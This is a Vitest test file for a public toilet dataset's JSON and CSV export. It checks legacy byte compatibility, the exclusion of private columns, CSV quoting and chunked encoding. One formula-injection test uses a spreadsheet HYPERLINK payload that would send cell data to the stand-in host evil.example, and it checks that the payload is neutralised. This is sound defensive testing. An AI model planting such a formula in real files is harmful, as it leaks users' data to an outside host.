import { readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";
import {
  buildCsv,
  buildJson,
  EXPORT_CSV_COLUMNS,
  EXPORT_JSON_COLUMNS,
  type ExportSourceRecord,
  encodeCsv,
  encodeJson,
  extractLngLat,
  neutraliseFormula,
  toExportToilet,
} from "../../src/services/export/format";

const fixture = (name: string) =>
  readFileSync(new URL(`../fixtures/dataset-export/${name}`, import.meta.url), "utf8");

/** The live legacy files' first bytes (see test/fixtures/dataset-export/README.md). */
const legacyJson = fixture("legacy-sample.json");
const legacyCsv = fixture("legacy-sample.csv");

type LegacyRecord = Record<string, unknown> & {
  created_at: string | null;
  updated_at: string | null;
  verified_at: string | null;
};

/**
 * A database row (as `LooService.getAllForExport` returns it) for a legacy
 * record, plus the private columns the export must never publish.
 */
const toSourceRow = (record: LegacyRecord) =>
  ({
    ...record,
    created_at: record.created_at ? new Date(record.created_at) : null,
    updated_at: record.updated_at ? new Date(record.updated_at) : null,
    verified_at: record.verified_at ? new Date(record.verified_at) : null,
    contributors: ["secret-contributor-handle", "someone@example.com"],
    removal_reason: "private removal reason",
    removal_category: "other",
    duplicate_of: "ffffffffffffffffffffffff",
    ip: "203.0.113.7",
    payload: { pending: "change" },
  }) as unknown as ExportSourceRecord;

const legacyRecords = JSON.parse(legacyJson) as LegacyRecord[];
const rows = legacyRecords.map(toSourceRow);

const baseRow: ExportSourceRecord = {
  id: "aaaaaaaaaaaaaaaaaaaaaaaa",
  created_at: new Date("2024-01-02T03:04:05.006Z"),
  accessible: true,
  active: true,
  attended: null,
  automatic: false,
  baby_change: null,
  men: true,
  name: "Test",
  no_payment: true,
  notes: null,
  payment_details: null,
  radar: null,
  women: true,
  updated_at: new Date("2024-02-02T00:00:00.000Z"),
  urinal_only: null,
  all_gender: null,
  children: null,
  geohash: "gcpvj0duq53",
  verified_at: null,
  area_id: null,
  opening_times: null,
  location: { type: "Point", coordinates: [-0.1, 51.5] },
  areas: null,
};

describe("dataset export format (legacy compatibility)", () => {
  it("rebuilds the legacy JSON byte for byte", () => {
    expect(buildJson(rows.map(toExportToilet))).toBe(legacyJson);
  });

  it("rebuilds the legacy CSV byte for byte, including a multi-line notes cell", () => {
    expect(buildCsv(rows.map(toExportToilet))).toBe(legacyCsv);
    expect(legacyCsv).toContain("\n\n10am-8pm (summer only)");
  });

  it("keeps the legacy column names and order", () => {
    const legacyHeader = legacyCsv.slice(0, legacyCsv.indexOf("\n"));
    expect(EXPORT_CSV_COLUMNS.join(",")).toBe(legacyHeader);
    expect(Object.keys(legacyRecords[0] ?? {})).toEqual([...EXPORT_JSON_COLUMNS]);
    expect(Object.keys(toExportToilet(baseRow))).toEqual([...EXPORT_JSON_COLUMNS]);
  });

  it("never publishes private columns, whatever the source row carries", () => {
    const json = buildJson(rows.map(toExportToilet));
    const csv = buildCsv(rows.map(toExportToilet));
    for (const text of [json, csv]) {
      for (const secret of [
        "contributors",
        "secret-contributor-handle",
        "someone@example.com",
        "removal_reason",
        "private removal reason",
        "removal_category",
        "duplicate_of",
        "ffffffffffffffffffffffff",
        "203.0.113.7",
        "payload",
        "pending",
      ]) {
        expect(text).not.toContain(secret);
      }
    }
  });
});

describe("dataset export CSV encoding", () => {
  const line = (row: Partial<ExportSourceRecord>) => {
    const csv = buildCsv([toExportToilet({ ...baseRow, ...row })]);
    return csv.slice(csv.indexOf("\n") + 1);
  };

  it("quotes every data cell and doubles quotes inside", () => {
    const record = line({ name: 'The "Big" Loo, Main St' });
    expect(record).toContain('"The ""Big"" Loo, Main St"');
  });

  it("keeps commas, CR/LF and unicode inside the quoted cell", () => {
    const record = line({ notes: "line one\r\nline two, with comma — and ünïcode" });
    expect(record).toContain('"line one\r\nline two, with comma — and ünïcode"');
  });

  it("writes null as an empty cell and booleans as true/false", () => {
    const record = line({});
    expect(
      record.startsWith(
        '"aaaaaaaaaaaaaaaaaaaaaaaa","2024-01-02T03:04:05.006Z","true","true","","false"',
      ),
    ).toBe(true);
  });

  it("writes JSON columns as JSON text, with nested nulls as empty strings (legacy)", () => {
    const record = line({
      opening_times: [["09:00", "17:00"], [], [], [], [], [], []],
      areas: { name: null, id: "bbbbbbbbbbbbbbbbbbbbbbbb" },
    });
    expect(record).toContain('"[[""09:00"",""17:00""],[],[],[],[],[],[]]"');
    expect(record).toContain('"{""name"":"""",""id"":""bbbbbbbbbbbbbbbbbbbbbbbb""}"');
  });

  it("ends with longitude and latitude from the location, empty without one", () => {
    expect(line({}).endsWith('"-0.1","51.5"')).toBe(true);
    expect(line({ location: null }).endsWith('"",""')).toBe(true);
  });

  it("has one header line, one line per toilet, no trailing newline", () => {
    const csv = buildCsv(
      [baseRow, { ...baseRow, id: "cccccccccccccccccccccccc" }].map(toExportToilet),
    );
    expect(csv.split("\n")).toHaveLength(3);
    expect(csv.endsWith("\n")).toBe(false);
  });

  it("neutralises text cells a spreadsheet would run as a formula", () => {
    const hyperlink = '=HYPERLINK("https://evil.example/?"&A2,"Click")';
    const record = line({ name: hyperlink, notes: "+44 20 7946 0000", payment_details: "@SUM(1)" });
    expect(record).toContain(`"'=HYPERLINK(""https://evil.example/?""&A2,""Click"")"`);
    expect(record).toContain(`"'+44 20 7946 0000"`);
    expect(record).toContain(`"'@SUM(1)"`);
    expect(record).not.toContain('"=HYPERLINK');
    for (const text of ["-1+2", "\tcmd", "\rcmd", "\uFF1D1+1"]) {
      expect(neutraliseFormula(text)).toBe(`'${text}`);
    }
    for (const text of ["Public toilets", "", "Pay 20p = 1 entry", "'quoted", "£0.50"]) {
      expect(neutraliseFormula(text)).toBe(text);
    }
  });

  it("leaves negative coordinates and the JSON file alone", () => {
    const record = line({ name: "=1+1", location: { type: "Point", coordinates: [-3.2, 55.9] } });
    expect(record.endsWith('"-3.2","55.9"')).toBe(true);
    const json = buildJson([toExportToilet({ ...baseRow, name: "=1+1" })]);
    expect(JSON.parse(json)[0].name).toBe("=1+1");
  });

  it("is empty for no rows (legacy)", () => {
    expect(buildCsv([])).toBe("");
    expect(buildJson([])).toBe("[]");
  });
});

describe("dataset export encoding to bytes", () => {
  const many = Array.from({ length: 1234 }, (_, index) =>
    toExportToilet({
      ...baseRow,
      id: index.toString(16).padStart(24, "0"),
      name: index % 7 === 0 ? `Café «${index}» "quoted"` : `Loo ${index}`,
      notes: index % 11 === 0 ? "line\nbreak, comma" : null,
    }),
  );
  const utf8 = (text: string) => new TextEncoder().encode(text);

  it("gives the same bytes as encoding the whole file, across chunk boundaries", () => {
    expect(encodeJson(many)).toEqual(utf8(buildJson(many)));
    expect(encodeCsv(many)).toEqual(utf8(buildCsv(many)));
    expect(buildJson(many)).toBe(JSON.stringify(many));
    expect(buildCsv(many).split("\n").length).toBe(
      1 + many.length + many.filter((toilet) => toilet.notes).length,
    );
  });

  it("matches the legacy fixtures as bytes too", () => {
    expect(encodeJson(rows.map(toExportToilet))).toEqual(utf8(legacyJson));
    expect(encodeCsv(rows.map(toExportToilet))).toEqual(utf8(legacyCsv));
  });

  it("encodes empty input as legacy did", () => {
    expect(encodeJson([])).toEqual(utf8("[]"));
    expect(encodeCsv([]).byteLength).toBe(0);
  });
});

describe("extractLngLat", () => {
  it("reads GeoJSON objects and strings", () => {
    expect(extractLngLat({ type: "Point", coordinates: [1.5, 2.5] })).toEqual({
      longitude: "1.5",
      latitude: "2.5",
    });
    expect(extractLngLat('{"type":"Point","coordinates":[1,2]}')).toEqual({
      longitude: "1",
      latitude: "2",
    });
  });

  it("returns empty strings for anything else", () => {
    for (const value of [
      null,
      undefined,
      "not json",
      { coordinates: [1] },
      { coordinates: ["a", "b"] },
    ]) {
      expect(extractLngLat(value)).toEqual({ longitude: "", latitude: "" });
    }
  });
});
